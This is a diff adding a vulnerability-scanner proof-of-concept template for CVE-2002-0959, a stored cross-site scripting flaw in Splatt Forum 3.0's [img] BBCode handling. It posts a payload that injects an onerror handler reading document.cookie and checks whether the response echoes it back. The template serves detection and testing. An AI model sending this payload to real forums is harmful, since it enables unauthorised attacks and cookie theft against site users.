@@ -1,0 +1,37 @@
+[info]
+author = "ave"
+description = "Splatt Forum 3.0 在处理 [img] BBCode 标签时未过滤 HTML 属性，攻击者可在论坛帖子中插入特制 img 标签，通过 onerror 事件处理器注入任意 JavaScript 脚本，当其他用户浏览帖子时脚本自动执行，窃取 Cookie 或篡改页面内容。"
+id = "POC-AVE-2002-0490"
+name = "Splatt Forum 3.0 IMG标签HTML注入跨站脚本漏洞 PoC"
+severity = "high"
+tags = [
+    "cve-2002-0959",
+    "xss",
+    "splatt-forum",
+]
+vuln_id = [
+    "CVE-2002-0959",
+    "AVE-2002-0490",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/forum/post.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "message=[img]http://a.a/a%22onerror=%22javascript:alert(document.cookie)[/img]&submit=Post"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ['[img]http://a.a/a"onerror="javascript:alert(document.cookie)[/img]']
